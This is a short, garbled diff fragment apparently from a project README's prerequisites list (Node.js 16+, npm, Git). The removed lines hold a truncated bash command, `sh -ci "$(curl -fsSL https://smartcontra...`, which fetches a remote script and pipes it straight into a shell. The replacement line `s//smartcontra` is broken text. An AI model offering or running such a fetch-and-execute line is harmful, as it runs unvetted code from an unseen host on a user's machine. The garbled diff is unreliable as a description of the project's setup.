@@ -1,8 +1,4 @@
-s
-
-:  
-  ```bash
-  sh -ci "$(curl -fsSL https://smartcontra
+s//smartcontra
 * **Node.js**: Version 16 or later – [Download](https://nodejs.org)
 * **npm**: Comes with Node.js
 * **Git**: For cloning the repo
